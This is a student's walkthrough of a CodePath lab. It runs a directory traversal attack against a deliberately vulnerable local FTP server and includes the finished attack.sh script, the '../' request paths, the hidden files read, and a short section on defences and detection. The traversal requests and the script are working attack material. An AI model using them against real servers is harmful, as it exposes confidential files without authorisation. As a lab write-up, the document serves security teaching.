Directory Traversal Attack Walkthrough


**Scenario:** Hired by the IRS to investigate "Fairly Oddparents Corp." a company suspected of hiding the truth about its earnings. They only publicly released a `general/` folder, but Timmy, Wanda, and Cosmo were suspected of hiding the real reports in their personal folders. My job: use a directory traversal attack to reach those hidden files.

> **First, the part that matters:** I completed this whole thing. I ran a working directory traversal attack, found the hidden files, exposed a falsified financial report, and fixed a broken bash script and a stuck Vim editor along the way. The messy middle below is normal, it's what real troubleshooting looks like.

---

## What I actually accomplished

- Started a vulnerable FTP server (`hftp`) and confirmed it served only `general/` publicly.
- Wrote/completed `attack.sh` to launch the attack automatically.
- Used `../` traversal to escape `general/` and read files I was never supposed to see.
- Found the **real** earnings the company was hiding.
- Debugged a broken bash assignment, a duplicated file, and a stuck Vim session.

---

## The setup

Inside `~/ftp_folder` I found:

| Item | What it is |
|------|-----------|
| `attack.sh` | The bash script I had to complete (the "attacker") |
| `scripts/start-server.js` | Boots the vulnerable `hftp` FTP server |
| `scripts/attack.js` | Sends a request to the server and prints whatever comes back |
| `general/` | The only folder the company released publicly |
| `timmy/`, `cosmo/`, `wanda/` | The suspects' personal folders (the targets) |
| `activity.pcapng` | Packet capture for the forensics task |

The server runs on `http://localhost:8888` and its workspace root is `/home/codepath/ftp_folder/`. The public file lives at `general/reports.txt`.

---

## Step-by-step: what I did

### 1. Confirmed the server script
`cat scripts/start-server.js` showed a single line:
```javascript
var pkg = require('/usr/local/lib/node_modules/hftp');
```
That `require` is what actually starts the vulnerable FTP server.

### 2. Started the server and tested the pipeline
```bash
node scripts/start-server.js &        # & runs it in the background
node scripts/attack.js "http://localhost:8888/general/reports.txt"
```
Response:
```
Earnings are up 900% this quarter!
```
This is the public (suspicious) claim. Pipeline works.

### 3. Performed the traversal
The trick is `../`, which climbs **out** of the folder the server intends to serve. Since the server doesn't sanitize the path, I escaped `general/` and reached the sibling folders.

**List Timmy's hidden folder:**
```bash
node scripts/attack.js "http://localhost:8888/general/../timmy/"
```
Revealed: `fishnames.txt`, `passwords.txt`, `reports_original.txt`

**Read Timmy's original report:**
```bash
node scripts/attack.js "http://localhost:8888/general/../timmy/reports_original.txt"
```
Response:
```
Earnings are down 1600%...
```
**This is the lie.** Public report said *up 900%*; the hidden original says *down 1600%*. (Stretch goal — done.)

**List and read Cosmo's folder:**
```bash
node scripts/attack.js "http://localhost:8888/general/../cosmo/"            # passwords.txt, reports_original.txt, rocknames.txt
node scripts/attack.js "http://localhost:8888/general/../cosmo/passwords.txt"   # -> password
node scripts/attack.js "http://localhost:8888/general/../cosmo/rocknames.txt"   # -> mr. rock
```

---

## The mistakes I hit (and how I fixed them)

This is the honest part. None of these are "doing it wrong" — they're the normal friction of working in a terminal.

### Mistake 1 — Broken bash assignment
The scaffold had:
```bash
ATTACK_PATH = "http://localhost:8888/general/reports.txt"
```
**Why it's broken:** bash does **not** allow spaces around `=`. With spaces, bash thinks `ATTACK_PATH` is a *command* and errors out.
**Fix:** remove the spaces.
```bash
ATTACK_PATH="http://localhost:8888/general/reports.txt"
```

### Mistake 2 — The file got duplicated in Vim
While editing, Steps 1 and 2 ended up pasted **twice** (the second copy even had a malformed `## Step 1`). Surgical line-by-line fixing got messy.
**Fix:** instead of fighting it, I wiped the file and rewrote it cleanly in one shot (see Mistake 4).

### Mistake 3 — Got stuck inside Vim
I accidentally landed in **Visual Block mode** (`-- VISUAL BLOCK --` at the bottom). My `:q!` got typed *into the file* instead of running as a command, producing junk like `:q!kill -9 $vulnpid`.
**Fix:**
1. Press `Esc` two or three times to leave any insert/visual mode.
2. Type `:q!` — it must appear at the **bottom-left** of the screen, not in the text.
3. Press Enter to quit without saving the mess.

**Vim survival cheat sheet:**
| I want to... | Do this |
|--------------|---------|
| Start typing | press `i` (insert mode) |
| Stop typing / run a command | press `Esc` (command mode) |
| Save and quit | `:wq` then Enter |
| Quit without saving | `:q!` then Enter |

### Mistake 4 — Rewriting the file cleanly
Rather than edit a mangled file, I rebuilt it from scratch with a *heredoc*. The quoted `'EOF'` tells bash to write everything literally (so `${GREEN}`, `$!`, and backticks are saved as-is):
```bash
cat > attack.sh << 'EOF'
...file contents...
EOF
```
Then verified with `cat attack.sh`. Clean.

---

## The finished `attack.sh`

```bash
#!/bin/bash
# Author: Liang Gong
# Modified by: Sar Champagne Bielert (CodePath)
# Modified by: Andrew Burke (CodePath)
# These lines help the output print in color!
RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color
### Step 1: Start the server
echo -e "\t[${GREEN}start vulnerable server${NC}]: ${BLUE}hftp${NC}"
node scripts/start-server.js &
vulnpid=$!
### Step 2: Wait for the server to get started
sleep 2
echo -e "\t[${GREEN}server root directory${NC}]: `pwd`"
### Step 3: Perform directory attack
ATTACK_PATH="http://localhost:8888/general/../timmy/reports_original.txt"
node scripts/attack.js "$ATTACK_PATH"
### Step 4: Clean up the vulnerable npm package's process
kill -9 $vulnpid
```

Run it with:
```bash
chmod +x attack.sh   # make it executable (only needed once)
./attack.sh
```

**Why each filled-in line matters:**
- `node scripts/start-server.js &` — the `&` runs the server in the **background** so the script can keep going. It's required because the next line, `vulnpid=$!`, captures the process ID (`$!`) of the most recent background job so the script can kill it later.
- `sleep 2` — gives the server a moment to come up before we hit it.
- `node scripts/attack.js "$ATTACK_PATH"` — runs the attack using the path stored in the variable.

---

## What I found

| Path (via traversal) | Contents |
|----------------------|----------|
| `general/reports.txt` (public) | Earnings are up 900% this quarter! *(the lie)* |
| `general/../timmy/reports_original.txt` | Earnings are down 1600%... *(the truth)* |
| `general/../cosmo/passwords.txt` | password |
| `general/../cosmo/rocknames.txt` | mr. rock |

**Verdict:** No, earnings are not up 900%. The hidden original report shows they're actually **down 1600%**. The public folder was a cover.

---

## What directory traversal actually is (in plain English)

A web/file server is supposed to serve files only from one folder (here, `general/`). A **directory traversal** attack abuses `../` ("go up one folder") to climb out of that intended folder and reach files elsewhere on the system. It works when the server **doesn't sanitize** the requested path. The damage: confidential files get exposed to people who should never see them.

---

## Why it works here and how you'd stop it (defense)

- **Root cause:** the `hftp` server trusts the path I send and resolves `../` literally, so it walks outside `general/`.
- **Fixes a real app would use:**
  - Sanitize and **canonicalize** the path, then reject anything that resolves outside the intended root.
  - Run the server **jailed** to a directory (chroot / container) so there's nowhere to traverse *to*.
  - Apply **least privilege** — the server account shouldn't be able to read the personal folders at all.
  - **Detect it:** alert on requests containing `../` or `..%2f` in the path (this is exactly what the `activity.pcapng` task is about).

---

## Key commands I learned

| Command | What it does |
|---------|--------------|
| `node script.js &` | Run a Node program in the background |
| `$!` | The PID of the last backgrounded process |
| `sleep 2` | Pause for 2 seconds |
| `chmod +x file.sh` | Make a script executable |
| `./file.sh` | Run an executable script in the current folder |
| `VAR="value"` | Assign a bash variable (no spaces around `=`!) |
| `cat > file << 'EOF' ... EOF` | Write a file from the terminal (heredoc) |
| `i` / `Esc` / `:wq` / `:q!` | Vim: insert / command / save+quit / quit-no-save |

---

## Reflection answers

**Q1 — Directory traversal in 3 emojis:** 🔙 🔙 📂 *(the `../ ../` climb back up into folders you shouldn't reach)*

**Q2 — Why use a `.sh` file?** Because the attack isn't one command — it's a sequence (start the server in the background → wait → set the target path → run the attack → kill the server). A shell script bundles that whole sequence into one repeatable, executable file, so I run it with a single `./attack.sh` instead of retyping every step, and it lets me store and reuse a variable like `ATTACK_PATH`.
